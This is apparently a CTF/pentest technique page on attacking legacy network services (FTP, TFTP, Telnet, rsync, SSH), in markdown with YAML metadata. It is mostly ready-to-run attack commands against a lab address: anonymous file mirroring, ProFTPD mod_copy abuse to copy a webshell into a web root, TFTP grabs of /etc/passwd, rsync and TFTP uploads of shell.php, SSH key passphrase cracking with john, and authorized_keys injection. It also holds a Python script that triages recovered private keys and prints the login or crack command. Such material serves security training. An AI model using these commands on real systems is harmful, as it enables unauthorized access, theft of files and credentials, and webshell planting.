---
title: "Legacy Services - FTP, TFTP, Telnet, rsync and SSH Misconfigurations"
category: misc
subcategory: network-services
type: technique
tags: [ftp, tftp, telnet, rsync, ssh, anonymous-login, vsftpd, proftpd, ssh2john, id-rsa, ssh-audit, user-enumeration, network-services, enumeration]
difficulty: easy
summary: "Old text protocols leak files and shells: anonymous FTP/rsync, TFTP blind grabs, weak Telnet creds, and SSH key/version pitfalls."
when_to_use:
  - "Ports 21 (FTP), 69/udp (TFTP), 23 (Telnet), 873 (rsync) or 22 (SSH) are open"
  - "You found an id_rsa, a writable FTP web root, or an anonymous rsync module"
  - "A service banner shows a version with a known backdoor or CVE"
  - "You need to move files onto or off the target with minimal tooling"
cves: [CVE-2011-2523, CVE-2015-3306, CVE-2018-15473]
tools: [ftp, tftp, telnet, rsync, ssh, ssh-audit, john, nmap]
related: [svc-cve-exploitation-workflow, net-pivoting-tunnelling, net-scanning-fingerprinting]
---

## TL;DR

The classic text protocols are still all over CTF boxes. Try **anonymous FTP** and **anonymous
rsync**, TFTP for known filenames, weak Telnet creds, and treat every recovered `id_rsa` as a login.
Match the banner to a backdoor (vsftpd 2.3.4, ProFTPD mod_copy) when the version fits.

## Recognise it

- `21/tcp ftp`, `69/udp tftp`, `23/tcp telnet`, `873/tcp rsync`, `22/tcp ssh`.
- FTP banner naming an exact daemon version (`vsftpd 2.3.4`, `ProFTPD 1.3.5`).
- An `id_rsa`, `id_ed25519`, `.ssh/authorized_keys` or `known_hosts` found anywhere.

## Attack

### FTP (21)

```bash
# Anonymous login (user: anonymous, any password)
ftp -inv 10.10.10.5 <<'EOF'
user anonymous anonymous
ls -la
EOF

# nmap checks anonymous access, the daemon, and the vsftpd backdoor
nmap -p21 --script "ftp-anon,ftp-syst,ftp-vsftpd-backdoor" -sV 10.10.10.5

# Mirror the whole server (passive mode, recurse)
wget -r --no-passive-ftp ftp://anonymous:anonymous@10.10.10.5/

# Grab a single file, forcing binary so it is not corrupted
curl -u anonymous:anonymous ftp://10.10.10.5/backup.zip -o backup.zip
```

- **Writable web root**: if the FTP root is also served by a web server, upload a webshell and hit
  it over HTTP.
- **vsftpd 2.3.4 backdoor (CVE-2011-2523)**: a username ending in `:)` opens a root shell on 6200.
- **ProFTPD 1.3.5 mod_copy (CVE-2015-3306)**: `SITE CPFR`/`SITE CPTO` copy arbitrary files without
  auth -- copy a webshell into the web root, or read `/etc/passwd`.

```bash
# ProFTPD mod_copy: copy an attacker-controlled file into the web root (no auth)
nc 10.10.10.5 21 <<'EOF'
SITE CPFR /home/user/shell.php
SITE CPTO /var/www/html/shell.php
EOF
```

### TFTP (69/udp)

TFTP has no listing and no auth -- you must know filenames.

```bash
# Fetch a known file
tftp 10.10.10.5 <<'EOF'
get /etc/passwd passwd.out
quit
EOF

# curl form
curl -s tftp://10.10.10.5/backup.conf -o backup.conf

# Upload (if the server allows PUT -- can drop a file into a writable dir)
tftp 10.10.10.5 <<'EOF'
put shell.php
quit
EOF
```

### Telnet (23)

```bash
# Grab the banner (often reveals device/OS and sometimes a login prompt with hints)
nc -nv 10.10.10.5 23

# Interactive login with known/default creds
telnet 10.10.10.5

# nmap enumerates the encryption/negotiation and NTLM info on some services
nmap -p23 --script "telnet-encryption,telnet-ntlm-info" -sV 10.10.10.5
```

Try default and site-derived credentials; many appliances ship `admin:admin` or `root:` blank.

### rsync (873)

```bash
# List rsync modules (shares) exposed without auth
rsync --list-only rsync://10.10.10.5/
nc -nv 10.10.10.5 873   # banner shows the protocol version

# List the contents of a module
rsync --list-only rsync://10.10.10.5/backup/

# Download an entire module
rsync -av rsync://10.10.10.5/backup/ ./backup-loot/

# Upload into a writable module (foothold if it maps to a web root / home dir)
rsync -av shell.php rsync://10.10.10.5/uploads/

# With credentials
rsync -av rsync://user@10.10.10.5/private/ ./ --password-file=pass.txt
```

### SSH (22)

```bash
# Banner and version (map to CVEs; e.g. user-enum CVE-2018-15473 on old OpenSSH)
nc -nv 10.10.10.5 22
ssh-audit 10.10.10.5

# Host key fingerprint (useful to detect a reused key across boxes)
ssh-keyscan 10.10.10.5

# Log in with a recovered private key (permissions MUST be tight)
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.5

# If the key has a passphrase, crack it
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Old servers reject modern algorithms -- re-enable ssh-rsa/legacy KEX explicitly
ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -i id_rsa user@10.10.10.5

# Old ciphers/KEX
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc user@10.10.10.5

# ProxyJump through a bastion to reach an internal host
ssh -J user@10.10.10.5 admin@10.10.20.7
```

- **authorized_keys write**: if you can write to a user's `~/.ssh/authorized_keys` (via FTP, NFS,
  a webshell, or Redis), add your public key and log in.
- **User enumeration (CVE-2018-15473)**: old OpenSSH leaks valid usernames via timing on malformed
  auth packets -- use a vetted checker, then spray only valid users.

## Code

Recovered-key sanity checker: fixes permissions, detects whether a private key is passphrase-
protected, and emits the exact next command (login or crack).

```python
#!/usr/bin/env python3
"""Triage a recovered SSH private key: encrypted? next step?

Usage:
    python3 sshkey_triage.py id_rsa [user@host]
"""
from __future__ import annotations

import os
import stat
import sys


def is_encrypted(path: str) -> bool:
    """Detect a passphrase-protected key across old-PEM and OpenSSH formats."""
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        data = fh.read()
    if "ENCRYPTED" in data:
        return True  # old PEM header: "Proc-Type: 4,ENCRYPTED"
    if "BEGIN OPENSSH PRIVATE KEY" in data:
        # OpenSSH format: unencrypted keys use the "none" cipher.
        # If the base64 body does not contain 'none', it is very likely encrypted.
        body = "".join(line for line in data.splitlines() if not line.startswith("-----"))
        try:
            import base64
            raw = base64.b64decode(body)
        except Exception:
            return False
        header = raw[:120]
        return b"none" not in header
    return False


def fix_perms(path: str) -> None:
    """chmod 600 so ssh will accept the key."""
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 1
    path = argv[1]
    target = argv[2] if len(argv) > 2 else "user@TARGET"
    if not os.path.exists(path):
        print(f"[-] {path} not found")
        return 1
    fix_perms(path)
    print(f"[*] set 0600 on {path}")
    if is_encrypted(path):
        print("[!] key is passphrase-protected -- crack it first:")
        print(f"    ssh2john {path} > {path}.hash")
        print(f"    john --wordlist=rockyou.txt {path}.hash")
    else:
        print("[+] key is NOT encrypted -- try logging in:")
        print(f"    ssh -i {path} {target}")
        print(f"    ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i {path} {target}   # if server is old")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **FTP ASCII vs binary.** Downloading a zip/binary in ASCII mode corrupts it -- use `binary` or curl.
- **FTP PASV/PORT.** Behind NAT/VPN, active mode fails; use passive (`--no-passive-ftp` toggles wget,
  curl uses passive by default).
- **TFTP is blind** -- you cannot list, so guess common names (`backup`, `config`, `startup-config`,
  `run`, `passwd`).
- **Backdoors are version-specific.** vsftpd 2.3.4 and ProFTPD 1.3.5 backdoors only fire on those
  exact versions; check the banner.
- **SSH key permissions.** ssh refuses a world-readable private key -- always `chmod 600`.
- **Legacy algorithms.** New OpenSSH clients disable `ssh-rsa`/old KEX by default; add them back
  explicitly to reach ancient servers.
- **rsync writes** can hand you a foothold if a module maps to a home dir or web root -- always test
  upload.

## Tools

- `ftp`, `wget`, `curl` -- FTP.
- `tftp`, `curl` -- TFTP.
- `telnet`, `nc` -- Telnet.
- `rsync` -- rsync modules.
- `ssh`, `ssh-audit`, `ssh-keyscan`, `ssh2john`, `john` -- SSH.
- `nmap` NSE for each protocol.

## References

- CVE-2011-2523 (vsftpd 2.3.4 backdoor), CVE-2015-3306 (ProFTPD mod_copy), CVE-2018-15473
  (OpenSSH user enumeration).
- RFC 959 (FTP), RFC 1350 (TFTP), RFC 854 (Telnet), the rsync protocol docs, RFC 4253 (SSH).
